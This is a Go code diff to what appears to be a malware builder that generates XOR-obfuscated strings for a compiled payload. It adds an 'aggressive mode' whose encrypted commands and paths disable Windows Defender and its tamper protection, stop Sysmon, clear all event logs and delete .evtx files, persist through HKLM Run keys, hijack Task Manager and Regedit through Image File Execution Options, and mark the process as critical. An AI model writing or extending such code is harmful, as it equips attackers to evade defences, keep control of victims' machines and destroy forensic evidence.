@@ -155,6 +155,28 @@ type globalValues struct {
 	OfflineMode         bool
 	XorKeyLiteral       string
 	EncAutoStealMode    string
+
+	EncNtdllDll              string
+	EncRtlAdjustPrivilege    string
+	EncRtlSetProcessIsCritical string
+	EncRegCreateKeyExW       string
+	EncSetNamedSecurityInfoW string
+	EncNetshExe              string
+	EncChangeServiceConfig2W string
+	EncDefenderPoliciesPath  string
+	EncDefenderRtpPath       string
+	EncDefenderSpynetPath    string
+	EncTamperProtectionPath  string
+	EncStopDefenderServiceCmd string
+	EncDisableDefenderTasksCmd string
+	EncHKLMRunPath           string
+	EncHKLMRunOncePath       string
+	EncIFEOBasePath          string
+	EncIFEOTargets           string
+	EncMonitoringTools       string
+	EncClearAllLogsCmd       string
+	EncDisableSysmonCmd      string
+	EncDeleteEvtxCmd         string
 }
 
 var disguiseNames = []string{
@@ -428,6 +450,33 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		OfflineMode:       cfg.OfflineMode,
 		XorKeyLiteral:     escapeGoString(key),
 		EncAutoStealMode:  xorWithKey(strings.TrimSpace(cfg.AutoSteal), key),
+
+		// Aggressive mode
+		EncNtdllDll:              xorWithKey("ntdll.dll", key),
+		EncRtlAdjustPrivilege:    xorWithKey("RtlAdjustPrivilege", key),
+		EncRtlSetProcessIsCritical: xorWithKey("RtlSetProcessIsCritical", key),
+		EncRegCreateKeyExW:       xorWithKey("RegCreateKeyExW", key),
+		EncSetNamedSecurityInfoW: xorWithKey("SetNamedSecurityInfoW", key),
+		EncNetshExe:              xorWithKey("netsh", key),
+		EncChangeServiceConfig2W: xorWithKey("ChangeServiceConfig2W", key),
+		EncDefenderPoliciesPath:  xorWithKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender", key),
+		EncDefenderRtpPath:       xorWithKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", key),
+		EncDefenderSpynetPath:    xorWithKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", key),
+		EncTamperProtectionPath:  xorWithKey("SOFTWARE\\Microsoft\\Windows Defender\\Features", key),
+		EncStopDefenderServiceCmd: xorWithKey("Stop-Service WinDefend -Force -ErrorAction SilentlyContinue; Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue", key),
+		EncDisableDefenderTasksCmd: xorWithKey("Get-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Windows Defender\\*' -ErrorAction SilentlyContinue | Disable-ScheduledTask -ErrorAction SilentlyContinue", key),
+		EncHKLMRunPath:           xorWithKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", key),
+		EncHKLMRunOncePath:       xorWithKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", key),
+		EncIFEOBasePath:          xorWithKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", key),
+		EncIFEOTargets: xorListWithKey([]string{
+			"taskmgr.exe", "regedit.exe", "msconfig.exe",
+		}, key),
+		EncMonitoringTools: xorListWithKey([]string{
+			"wireshark.exe", "procmon.exe", "procmon64.exe", "tcpview.exe", "processhacker.exe",
+		}, key),
+		EncClearAllLogsCmd:  xorWithKey("wevtutil el | ForEach-Object { wevtutil cl $_ 2>$null }", key),
+		EncDisableSysmonCmd: xorWithKey("Stop-Service Sysmon -Force -ErrorAction SilentlyContinue; Stop-Service Sysmon64 -Force -ErrorAction SilentlyContinue; sc.exe config Sysmon start=disabled 2>$null; sc.exe config Sysmon64 start=disabled 2>$null", key),
+		EncDeleteEvtxCmd:    xorWithKey("Remove-Item -Path (Join-Path $env:SystemRoot 'System32\\winevt\\Logs\\*.evtx') -Force -ErrorAction SilentlyContinue", key),
 	}, nil
 }
 
@@ -597,6 +646,28 @@ var encCertFreeCertCtxName = "%s"
 var encCertCloseStoreName = "%s"
 var encAutoStealMode = "%s"
 
+var encNtdllDll = "%s"
+var encRtlAdjustPrivilegeName = "%s"
+var encRtlSetProcessIsCriticalName = "%s"
+var encRegCreateKeyExWName = "%s"
+var encSetNamedSecurityInfoWName = "%s"
+var encNetshExe = "%s"
+var encChangeServiceConfig2WName = "%s"
+var encDefenderPoliciesPath = "%s"
+var encDefenderRtpPath = "%s"
+var encDefenderSpynetPath = "%s"
+var encTamperProtectionPath = "%s"
+var encStopDefenderServiceCmd = "%s"
+var encDisableDefenderTasksCmd = "%s"
+var encHKLMRunPath = "%s"
+var encHKLMRunOncePath = "%s"
+var encIFEOBasePath = "%s"
+var encIFEOTargets = "%s"
+var encMonitoringTools = "%s"
+var encClearAllLogsCmd = "%s"
+var encDisableSysmonCmd = "%s"
+var encDeleteEvtxCmd = "%s"
+
 var decryptionKey = []byte("%s")
 `,
 		escapeGoString(g.ForceAdmin),
@@ -746,6 +817,29 @@ var decryptionKey = []byte("%s")
 		g.EncCertFreeCertCtx,
 		g.EncCertCloseStore,
 		g.EncAutoStealMode,
+
+		g.EncNtdllDll,
+		g.EncRtlAdjustPrivilege,
+		g.EncRtlSetProcessIsCritical,
+		g.EncRegCreateKeyExW,
+		g.EncSetNamedSecurityInfoW,
+		g.EncNetshExe,
+		g.EncChangeServiceConfig2W,
+		g.EncDefenderPoliciesPath,
+		g.EncDefenderRtpPath,
+		g.EncDefenderSpynetPath,
+		g.EncTamperProtectionPath,
+		g.EncStopDefenderServiceCmd,
+		g.EncDisableDefenderTasksCmd,
+		g.EncHKLMRunPath,
+		g.EncHKLMRunOncePath,
+		g.EncIFEOBasePath,
+		g.EncIFEOTargets,
+		g.EncMonitoringTools,
+		g.EncClearAllLogsCmd,
+		g.EncDisableSysmonCmd,
+		g.EncDeleteEvtxCmd,
+
 		g.XorKeyLiteral,
 	)), nil
 }
